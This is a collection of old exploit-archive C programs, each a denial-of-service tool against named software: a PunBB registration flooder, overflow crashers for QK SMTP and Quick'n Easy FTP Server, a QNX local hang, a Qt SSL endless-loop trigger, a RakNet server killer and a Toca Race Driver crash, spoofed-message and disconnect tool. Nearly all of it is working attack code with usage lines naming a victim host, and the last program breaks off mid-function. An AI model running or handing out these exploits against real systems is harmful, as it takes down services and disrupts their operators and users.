  Use only at your own reputation risk! ;)        

  www.NeoSecurityTeam.net                         
  #################################################

  [1] - Trying if connection is possible...
  [2] - Connected!
  [3] - Flooding localhost...
  
  Use it at your own risk!.
*/

#define WINDOWS
//#define LINUX

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifdef WINDOWS
#include <winsock2.h>
#include <windows.h>
// Link to (lib)ws2_32.a
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#endif

#define NST_ALIVE 1

int  Connect(char*);
void SendPack(int, int, char*, char*); 
void _perror(char*);
void HowTo(char*);

int main(int argc, char* argv[])
{
  int vict_sock, dos = 0;
  puts("#################################################");
  puts(" PunBB 2.0.10 Denial of Service exploit by K4P0  ");
  puts(" Use only at your own reputation risk! ;)        \n");
  puts(" www.NeoSecurityTeam.net                         ");
  if(argc < 4) HowTo(argv[0]);
  puts("#################################################\n");

  printf("[1] - Trying if connection is possible...\n", argv[1]);
  fflush(stdout);
  vict_sock = Connect(argv[2]);
  printf("[2] - Connected!\n");
  printf("[3] - Flooding %s", argv[1]);
  #ifdef WINDOWS
  closesocket(vict_sock);
  #else
  close(vict_sock);
  #endif
  
  while(NST_ALIVE)
  {
                         if(!(dos % 10)) fprintf(stderr, ".");
                         vict_sock = Connect(argv[2]);
                         SendPack(vict_sock, dos, argv[3], argv[1]);
                         dos++;
                         #ifdef WINDOWS
                         closesocket(vict_sock);
                         WSACleanup();
                         #else
                         close(vict_sock);
                         #endif
  }
  return 0;
}
// I'm to lazy to use gethostby(addr|name) :)
int Connect(char* IP)
{
    struct sockaddr_in *_addr;
    int vict_sck;
    
    #ifdef WINDOWS
    WSADATA wsaData;
    if(WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
    {
                              //WSAGetLastError()? Nah...
                              fprintf(stderr, "[*]   WSAStartup() failed");
                              exit(-1);
    }
    #endif
    
    if(!(_addr=(struct sockaddr_in *)malloc(sizeof(struct sockaddr_in))))
    {
                     fprintf(stderr, "[*]   Unable to reserve memory");
                     exit(-1);
    }
      
    memset(_addr, 0x0, sizeof(struct sockaddr_in));
    _addr->sin_family = AF_INET;
    _addr->sin_port   = htons(80);
    _addr->sin_addr.s_addr = inet_addr(IP);
    
    #ifdef WINDOWS
    if((vict_sck = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) < 0)
    {
                 fprintf(stderr, "WSASocket() failed");
                 exit(-1);
    }
    else
    if((vict_sck = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) 
                 _perror("socket() ");
    #endif
    
    if(connect(vict_sck, (struct sockaddr *)_addr, sizeof(struct sockaddr)) < 0)
                 _perror("connect() "); 
    
    free(_addr);
    return vict_sck; 
}

void SendPack(int v_sck, int var, char* path, char* DNS)
{
     char *HTTP_PACK, *HTTP_MPCK, *HTTP_POST;
     if(!(HTTP_PACK = (char *)malloc(2048)) || !(HTTP_MPCK = (char *)malloc(1024)) ||
        !(HTTP_POST = (char *)malloc(512)))
     {
                    fprintf(stderr, "Error trying to reserver memory");
                    exit(-1);
     }
     sprintf(HTTP_PACK, "POST %sregister.php?action=register HTTP/1.1\n"
                        "Host: %s\n"
                        "User-Agent: Mozilla/5.0 Gecko/20050511 Firefox/1.0.4\n"
                        "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n"
                        "Accept-Language: es-ar,es;q=0.8,en-us;q=0.5,en;q=0.3\n"
                        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n"
                        "Keep-Alive: 300\n"
                        "Proxy-Connection: keep-alive\n"
                        "Referer: http://%s%sregister.php\n"
                        "Content-Type: application/x-www-form-urlencoded\n", path, DNS, DNS, path);
                                                                            
     sprintf(HTTP_POST, "form_sent=1&req_username=%d__NsT&req_password1=flood&req_password2=flood&"
                        "req_email1=%d_peace@NsT.net&timezone=-10&email_setting=1", var, var);
     
     sprintf(HTTP_MPCK, "Content-Length: %d\n\n", strlen(HTTP_POST));
        
     strcat(HTTP_PACK, HTTP_MPCK);
     strcat(HTTP_PACK, HTTP_POST);
     send(v_sck, HTTP_PACK, strlen(HTTP_PACK), 0);
     
     free(HTTP_PACK);
     free(HTTP_MPCK);
     free(HTTP_POST);
     return;
}

void _perror(char* msg)
{
     perror(msg);
     fflush(stdout);
     exit(-1);
}

void HowTo(char* program)
{
     fprintf(stderr, "%s <DNS> <IP> <Path>\n", program);
     fprintf(stderr, "f.e: ./NsT-XplPunbb www.victim.com 2.0.0.6 /punbb/\n");
     fprintf(stderr, "#################################################");
     exit(0);
}

// milw0rm.com [2006-02-20]
/*
=============================================================
0-day RCPT TO DoS Exploit for QK SMTP version 3.01 and lower.
=============================================================
Exploit affects a format string error in the RCPT TO command
in which the program attempts to print out the string back
to the console screen of the application. (RCPT TO: %s)
This PoC code could possibly be re-written to allow buffer
overflow and execution of code. (I unfortanetly lack time at
the moment to continue any more reasarch and development)

EIP, EBP, ESI and EAX can be overwritten with buffer code
but the program formats it in Unicode. Results can be similar
to this:
Buffer = "A"
EIP = 00400040
EBP = 00400040
ESI = 00400040

QK SMTP 3.01 is available here:
http://www.qksoft.com/qk-smtp-server/download.html
and at various shareware download sites across the internet.
Google "FREE SMTP" and it should pop up quickly

This was quickly compiled in LCC-Win32 (Free C++ compiler and IDE)
- Greg Linares
Questions/Comments/Etc --> GLinares.code [at] gmail [dot] com
*/



#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>

#pragma comment(lib,"wsock32.lib")

int main(int argc, char *argv[])
{
static char overflow[65000];
static char buff2[65000];
WSADATA wsaData;


struct hostent *hp;
struct sockaddr_in sockin;
char buf[300], *check;
int sockfd, bytes;
int i;
char *hostname;
unsigned short port;

if (argc <= 1)
   {
	  printf("QK SMTP <= 3.01 DoS RCPT TO: Overflow\n");
	  printf("By: Greg Linares (glinares.code [at ] gmail [dot] com)\n\n");
      printf("Usage: %s [hostname] [port]\n", argv[0]);
      printf("default port is 25 \n");

      exit(0);
   }


hostname = argv[1];
if (argv[2]) port = atoi(argv[2]);
else port = atoi("25");

if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
   {
      fprintf(stderr, "Error setting up with WinSock v1.1\n");
      exit(-1);
   }


   hp = gethostbyname(hostname);
   if (hp == NULL)
   {
      printf("ERROR: Uknown host %s\n", hostname);
	  printf("%s",hostname);
      exit(-1);
   }

   sockin.sin_family = hp->h_addrtype;
   sockin.sin_port = htons(port);
   sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Socket Error\n");
      exit(-1);
   }

   if ((connect(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   {
      printf("ERROR: Connect Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   printf("Connected to [%s] on port [%d], sending overflow....\n",
          hostname, port);


   if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Recv Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(1);
   }

   /* wait for SMTP service welcome*/
   buf[bytes] = '\0';
   check = strstr(buf, "2");
   if (check == NULL)
   {
      printf("ERROR: NO  response from SMTP service\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   static char Exp1[65000];
   memset(Exp1, 0, 4096);
   char Exp[] = "RCPT TO: ";
   char tail[] = "@a.com>\r\n";
   char A[] = "A";
   memset(overflow, 0, 65000);
   memset(buff2, 0, 100);
   for (i=0; i<100; i++)
	{
	   strcat(buff2, "A");
	}

   char EHLO[] = "EHLO \r\n";
   char MF[] = "MAIL FROM: <HI@";
 	strcat(overflow, MF);
	strcat(overflow, buff2);
	strcat(overflow, tail);



   send(sockfd, EHLO, strlen(EHLO), 0);
	Sleep(500);
	send(sockfd, overflow, strlen(overflow),0);
	Sleep(1000);
	strcat(Exp1, Exp);
	for (i=0; i<4096; i++){
		strcat(Exp1, A);
	}
	strcat(Exp1, tail);
	printf("%s", Exp1);
	send(sockfd, Exp1, strlen(Exp1),0);
	Sleep(2000);
    printf("Overflow Packet Sent Successfully...\n");
	closesocket(sockfd);
   WSACleanup();
 }

// milw0rm.com [2006-10-23]
source: http://www.securityfocus.com/bid/6114/info

A denial of service vulnerability has been discovered in QNX.

It has been reported that it is possible for unprivileged users to cause QNX systems to stop responding, by creating multiple timers containing specific characteristics.

It should be noted that this issue was reported for QNX 6.1. It is not yet known whether this issue affects other releases.

/*
 * QNX RTP 6.1 Local DoS exploit
 *
 * author: Pawel Pisarczyk <pawel@immos.com.pl>, 2002
 *
 * After compilation and output binary execution system hangs.
 */
 
#include <errno.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/neutrino.h>
#include <inttypes.h>


int main(int argc, char *argv[])
{
	struct sigevent event;
	struct _itimer itimer;
	int chid;
	int tmid;
	int coid;
	int k;
		

	if ((chid = ChannelCreate(0)) < 0) {
		fprintf(stderr, "Can't create channel!\n");
		exit(-1);
	}
	
	if ((coid = ConnectAttach(0, getpid(), chid, 0, 0)) < 0) {
		fprintf(stderr, "Can't connect to channel!\n");
		exit(-1);
	}
	
	
	for (k = 0; k < 16; k++) {
	
		SIGEV_PULSE_INIT(&event, coid, 16, _PULSE_CODE_MINAVAIL + 1, k);
		
		if ((tmid = TimerCreate(CLOCK_REALTIME, &event)) < 0) {
			fprintf(stderr, "Can't create timer!\n");
			return -1;
		}


		itimer.nsec = 1000000;
		itimer.interval_nsec = 1000000;
		TimerSettime(tmid, 0, &itimer, NULL);
	}
	
	
	while (getc(stdin) != '#');
	return 0;
}
/*
  by Luigi Auriemma
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <openssl/ssl.h>    // link with libssl.a libcrypto.a -lgdi32

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
    #define strnicmp strncasecmp
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define BUFFSZ      1024

#define SSL_CLOSE   SSL_shutdown(ssl_sd); \
                    SSL_free(ssl_sd); \
                    SSL_CTX_free(ctx_sd); \
                    close(sd);
#define SSL_COMP(X) SSL_CTX_set_cipher_list(X, "ALL"); \
                    SSL_CTX_set_options(X, SSL_OP_ALL);



int mysend(SSL *ssl_sd, int sd, u8 *data, int datasz);
int myrecv(SSL *ssl_sd, int sd, u8 *data, int datasz);
int putcc(u8 *data, int chr, int size);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    static struct   linger  ling = {1,1};
    const SSL_METHOD  *method;
    SSL_CTX *ctx_sd = NULL;
    SSL     *ssl_sd = NULL;
    struct  sockaddr_in peer;
    int     sd,
            try;
    u16     port;
    u8      *buff,
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    fputs("\n"
        "Qt <= 4.6.3 QSslSocket endless loop "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stderr);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <host> <port>\n"
            "\n", argv[0]);
        exit(1);
    }
    host = argv[1];
    port = atoi(argv[2]);

    SSL_library_init();
    //SSL_load_error_strings();

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(0xffff);
    if(!buff) std_err();

    for(try = 0;; try++) {
        switch(try) {
            case 0: method = SSLv3_method();    break;
            case 1: method = TLSv1_method();    break;
            case 2: method = SSLv2_method();    break;
            case 3: method = DTLSv1_method();   break;
            case 4: method = SSLv23_method();   break;
            default: {
                printf("\nError: unsupported SSL method or not a SSL connection\n");
                exit(1);
                break;
            }
        }
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
        if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
          < 0) std_err();

        ctx_sd = SSL_CTX_new(method);
        SSL_COMP(ctx_sd)
        ssl_sd = SSL_new(ctx_sd);
        SSL_set_fd(ssl_sd, sd);

        // mysend is necessary to guess if the ssl version is wrong
        if((SSL_connect(ssl_sd) < 0) || (mysend(ssl_sd, sd, "", 0) != 0)) {
            SSL_CLOSE
            printf("- try another SSL version\n");
        } else {
            break;
        }
    }

    printf("- send malformed data\n");
    p = buff;
    p += putcc(p, 1, BUFFSZ);
    send(sd, buff, p - buff, 0);    // only the first (lame) way I found

    // no need to wait, it's linger
    SSL_CLOSE
    printf("\n- done, check the server manually\n");
    return(0);
}



int mysend(SSL *ssl_sd, int sd, u8 *data, int datasz) {
    if(ssl_sd) return(SSL_write(ssl_sd, data, datasz));
    return(send(sd, data, datasz, 0));
}



int myrecv(SSL *ssl_sd, int sd, u8 *data, int datasz) {
    if(ssl_sd) return(SSL_read(ssl_sd, data, datasz));
    return(recv(sd, data, datasz, 0));
}



int putcc(u8 *data, int chr, int size) {
    memset(data, chr, size);
    return(size);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            fprintf(stderr, "\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*****************************************************************

Quick'n Easy FTP Server 3.0 (pro and lite) Remote D.o.S Exploit by Kozan
( Based on matiteman's code in perl )

Application: Quick 'n Easy FTP Server 3.0 (pro and lite)
Vendor: www.pablosoftwaresolutions.com

Discovered by: matiteman
Exploit Coded by: Kozan
Credits to ATmaCA, matiteman
Web: www.spyinstructors.com
Mail: kozan@spyinstructors.com

*****************************************************************/

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>


#pragma comment(lib,"ws2_32.lib")

char Buff[] =
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41";



int main(int argc, char *argv[])
{
       fprintf(stdout, "Quick'n Easy FTP Server 3.0 (pro and lite) Remote D.o.S Exploit by Kozan\n");
       fprintf(stdout, "Discovered by: matiteman\n");
       fprintf(stdout, "Exploit Coded by: Kozan\n");
       fprintf(stdout, "Credits to ATmaCA, matiteman\n\n");
       fprintf(stdout, "www.spyinstructors.com - kozan@spyinstructors.com\n");

       if(argc<2)
       {
               fprintf(stderr, "\n\nUsage: %s [Target IP]\n\n", argv[0]);
               return -1;
       }
       WSADATA wsaData;
       SOCKET sock;

       if( WSAStartup(0x0101,&wsaData) < 0 )
       {
               fprintf(stderr, "Winsock error!\n");
               return -1;
       }

       sock = socket(AF_INET,SOCK_STREAM,0);
       if( sock == -1 )
       {
               fprintf(stderr, "Socket error!\n");
               return -1;
       }

       struct sockaddr_in addr;

       addr.sin_family = AF_INET;
       addr.sin_port = htons(21);
       addr.sin_addr.s_addr = inet_addr(argv[1]);
       memset(&(addr.sin_zero), '\0', 8);

       fprintf(stdout, "Connecting to %s ...\n", argv[1]);

       if( connect( sock, (struct sockaddr*)&addr, sizeof(struct sockaddr) ) == -1 )
       {
               fprintf(stderr, "Connection failed!\n");
               closesocket(sock);
               return -1;
       }

       fprintf(stdout, "Connected.\n");

       char *pszBuf1 = (char *)malloc(sizeof(Buff)+10);

       wsprintf(pszBuf1, "USER %s\r\n", Buff);

       fprintf(stdout, "Sending B.o.F USER command ...\n");

       if( send(sock,pszBuf1,strlen(pszBuf1),0) == -1 )
       {
               fprintf(stderr, "Could not sent!\n");
               closesocket(sock);
               return -1;
       }

       fprintf(stdout, "String sent...\n");
       Sleep(500);
       fprintf(stdout, "Please wait, checking if the server crashed or not...\n");

       if( send(sock,pszBuf1,strlen(pszBuf1),0) == -1 )
       {
               fprintf(stdout, "Server Crashed!!!\n");
               closesocket(sock);
               return -1;
       }

       fprintf(stdout, "Server is still alive. Maybe it is not vulnerable or allready patched!\n");
       closesocket(sock);
       WSACleanup();

       return 0;
}

// milw0rm.com [2005-08-02]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER         "0.1"



u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u_short port;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "Raknet library <= 2.33 (before 30 May 2005) server termination "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <host> <port>\n"
            "\n", argv[0]);
        exit(1);
    }

    port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- send BOOM packet\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    sendto(sd, "", 0, 0, (struct sockaddr *)&peer, sizeof(peer));
    close(sd);

    fputs("- the server should be terminated or freezed, check it manually\n", stdout);
    return(0);
}



u_int resolv(char *host) {
    struct hostent *hp;
    u_int  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

/*

by Luigi Auriemma

This source is covered by GNU/GPL

UNIX & WIN VERSION
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "rdcksum.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>

    #define ONESEC  1
#endif




#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        10200
#define TIMEOUT     4
#define SIGN        "\x05\x02\x00\x00"
#define NICK        "Fake_player"
#define MSGHDR      "\x42\x00\x00" \
                    "\x14" \
                    "\x00\xFF" \
                    "\x00" \
                    "\x00\x00\x00\x00"

#define SNDRCV(x,y) \
    if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, plen) \
      < 0) std_err(); \
    if(timeout(sd) < 0) { \
        fputs("\n" \
            "Error: socket timeout, probably the server is not online, it is not a Race\n" \
            "       Driver 1 game or more probably it uses a version different by that\n" \
            "       specified by you.\n" \
            "       Try to use a different version option (-v)\n", stdout); \
        close(sd); \
        exit(1); \
    } \
    if(recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &plen) \
      < 0) std_err(); \
    fputc('.', stdout);




int timeout(int sock);
u_long resolv(char *host);
void std_err(void);




int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                port = PORT,
                i,
                msglen,
                plen;
    u_char      *buff,
                rd1[] =
                    "\x45"
                    "\x00\x00"          /* checksum */
                    "\x00\x00\x00\x00"  /* source IP */
                    "\xff\xff\x00\x00"  /* pck ID */
                    SIGN,               /* Race Driver sign */
                rd2[] =
                    "\xC8\x00\x00\x00\x00"
                    SIGN
                    "\x00\xA0\x0F\x00\x00\xA0\x0F"
                    "\x00\x00\x0B\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x00\x00"  /* password */
                    "\x00\x00\x00\x00\x00\x00\x00\x00",
                rd3[] =
                    "\x50\x00\x00\x00\x00"
                    "\x00\x00\x00\x00\x00",
                crash[] =
                    "\x42\x00\x00"
                    "\x14"              /* event = message */
                    "\x00\xFF\x00"
                    "\x00\x00\x00\x00", /* length of the message, 0 = crash */
                disc1[] =
                    "\xD7\x00\x00\x00\x00\x01\x00\x00"
                    "\x17\xFE\xFE"
                    "\x00\x00\x00\x00\x00\x00\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x00\x00",
                disc2[] =
                    "\x42\x00\x00"
                    "\x05"              /* event = leave race */
                    "\x00\xFF\x00",
                *msg    = 0,
                attack  = 0,
                id      = 0,
                version = 10;


    setbuf(stdout, NULL);

    fputs("\n"
        "Toca Race Driver 1 multiple DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\nUsage: %s [options] <attack> <server>\n"
            "\n"
            "Options:\n"
            "-p PORT    destination port (default %d)\n"
            "-v NUM     version of the game to attack:\n"
            "           10    = version 1.20  (latest retail patch, DEFAULT)\n"
            "           11    = version 1.1   (both demo and first retail)\n"
            "           other = customizable version, for possible future patches\n"
            "\n"
            "Attack options (needed):\n"
            "-m ID MSG  fake message, the server receives a message from a specific user\n"
            "           identified by ID. The administrator has ever ID 0\n"
            "           Instead MSG is the message you wanna send, example: -m 0 \"I suck\"\n"
            "           The messages are completely anonymous, you will not compare in the\n"
            "           players list and the server can launch the race without problems\n"
            "-f ID MSG  as above but floods the server with the same message each second.\n"
            "           The flooding continues also during the race!\n"
            "-c         crashs the remote server and all the attached clients using a\n"
            "           message of length 0\n"
            "-d         Disconnects everyone in the server, admin too\n"
            "\n"
            "Remember you must have access to the server for using these attacks, so if the\n"
            "server is protected by password you must know it\n"
            "The attacks -c and -d work versus servers <= 1.20, actually doesn't exist a\n"
            "patch for the game\n"
            "\n", argv[0],
            PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    argc--;
    for(i = 1; i < argc; i++) {
        switch(argv[i][1]) {
            case 'p': port = atoi(argv[++i]); break;
            case 'v': version = atoi(argv[++i]); break;
            case 'm': attack = -1;  // little trick for -m/-f
            case 'f': {
                attack += 2;
                id = atoi(argv[++i]);
                msglen = strlen(argv[++i]);
                msg = malloc(msglen + sizeof(MSGHDR) - 1);
                if(!msg) std_err();
                memcpy(msg, MSGHDR, sizeof(MSGHDR) - 1);
                msg[6] = id;
